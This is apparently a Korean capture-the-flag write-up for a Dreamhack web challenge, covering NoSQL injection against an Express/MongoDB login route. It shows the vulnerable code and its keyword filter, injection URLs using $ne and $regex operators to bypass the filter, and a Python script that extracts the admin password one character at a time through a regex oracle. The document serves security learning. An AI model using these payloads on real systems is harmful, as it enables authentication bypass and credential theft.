created: 2026-01-22 17:20
category: #web 
link: https://dreamhack.io/wargame/challenges/90

# Write-up
```javascript
app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});
```
- 우선 로그인 API이다. 요청 쿼리에 약간의 필터링을 거친 후 `user` DB에서 `findOne` 메서드를 호출한다. 
- 그리고 플래그는 문제 설명에 나와있듯이, "admin" 계정의 비밀번호가 플래그이다. 

```javascript
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```
- 하지만, 위처럼 플래그나 "admin"에 관련된 단어를 필터링하고 있었다. 

일단 NoSQL injection 공격이 통하는지 확인하기 위하여 우선 `/login` API에 쿼리 파라미터로 `{ $ne: null }` 객체를 전달하고 싶었다. 
찾아보면, express에서 url을 파싱할 때 기본적으로 `qs` 라이브러리를 사용하는 듯하다. 
```js
assert.deepEqual(qs.parse('foo[bar]=baz'), {
    foo: {
        bar: 'baz'
    }
});
```
- `qs`의 공식문서 예제이다. `foo[bar]=baz`를 통해 `{ bar: 'baz' }` 객체를 `foo`에 전달할 수 있는데, 이처럼 다양한 방식으로 복잡한 데이터를 전달할 수 있는 게 특징이다. 

따라서 `/login?uid[$ne]=null&upw[$ne]=null`을 통해 
```json
{
	uid: {
		$ne: null
	}, 
	upw: {
		$ne: null
	}
}
```
이런식으로 데이터를 전달할 수 있게 되었다. 

해당 데이터를 전송했을 때 "guest"가 출력되었던 것 같다. 작동은 되므로 이제 "admin"으로 로그인하여 플래그를 획득하고자 했다.
그러나 필터링 키워드에 "admin"과 "admi"가 있었으므로 우회를 해야했다.  
뭔가 MongoDB에 정규식이 있을 것 같아서, 정규식을 이용해서 `uid`에 "dmin"이 포함된 도큐먼트를 찾고자했다. 

MongoDB에서 정규식을 사용하는걸 찾아보니 `$regex` 연산자를 이용하면 된다고 나와있었다. 
그리하여 `/login?uid[$regex]=min&upw[$ne]=null`로 접속하니 "admin"이 출력되었다. 뭔가 로그인은 된거 같은데 `uid` 값만 나오고 `upw` 값은 나오지 않았다. 
다시 코드를 보니 `res.send(result['uid']);` 이렇게 되어 있었다. 
`uid`에서 `upw`의 값을 넣어서 출력되게 하는 방법을 생각해보았지만, 이건 너무 복잡하고 아닌 것 같았다. 

문제 코드를 보면 "flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}" 이러한 주석이 있다. `upw`의 "32alphanumeric"이 그냥 있는 게 아닌 듯 하다.
정규식에서 문자열의 몇 번째 원소가 어떤 글자인지 검증하는 문법도 있었다. 예를 들어 3번째 문자가 'C'인지 아닌지 검증하는 게 가능했다. 
플래그 값이 alphanumeric으로 이루어진 32글자인 것을 이용해 exploit 코드를 작성해야겠다고 생각했다. 

```python
import string
import requests


result = ""
alphanumeric = string.ascii_letters + string.digits
for i in range(32):
    print(f"Finding character {i}...")
    for c in alphanumeric:
        # DH{}
        # uid[$regex]=min&upw[$regex]=^.{2}{
        url = f"http://host3.dreamhack.games:14599/login?uid[$regex]=min&upw[$regex]=^.{{{i + 3}}}{c}"
        response = requests.get(url)

        data = response.text

        if "undefined" not in data or "admin" in data:
            result += c
            print(f"Found character {i}: {c}")
            break

print(f"Result: DH{{{result}}}")
```
- 위와 같이 최종 exploit 코드를 작성하여 플래그를 획득할 수 있었다.
# Reference
- https://stackblitz.com/edit/js-avqfwz?file=index.js
- https://portswigger.net/web-security/nosql-injection
- https://github.com/ljharb/qs
- https://www.geeksforgeeks.org/mongodb/mongoose-findone-function/
- https://king-koala.tistory.com/14
- https://www.bobong.blog/post/advanced_skill/mongodb_injection
- https://www.mongodb.com/ko-kr/docs/manual/reference/operator/query/regex
- https://www.mongodb.com/ko-kr/docs/manual/reference/operator/query/ne/
- https://expressjs.com/en/4x/api.html#express.urlencoded